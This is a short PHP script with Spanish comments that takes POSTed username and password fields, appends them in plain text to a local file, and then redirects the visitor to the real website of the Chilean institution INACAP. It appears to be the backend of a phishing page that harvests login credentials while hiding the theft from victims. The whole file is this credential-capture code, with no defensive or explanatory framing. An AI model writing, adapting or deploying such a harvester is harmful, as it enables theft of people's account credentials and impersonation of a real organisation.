<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Método no permitido
    echo "Método no permitido.";
    exit;
}

if (isset($_POST['UserName']) && isset($_POST['Password'])) {
    $file = fopen("archivo.txt", "a");
    fwrite($file, "Usuario: ".$_POST['UserName']." - Contraseña: ".$_POST['Password']." ".PHP_EOL);
    fclose($file);

    // Redirigir después de guardar
    header("Location: https://www.inacap.cl");
    exit;
} else {
    http_response_code(400); // Solicitud incorrecta
    echo "Faltan parámetros.";
    exit;
}
?>
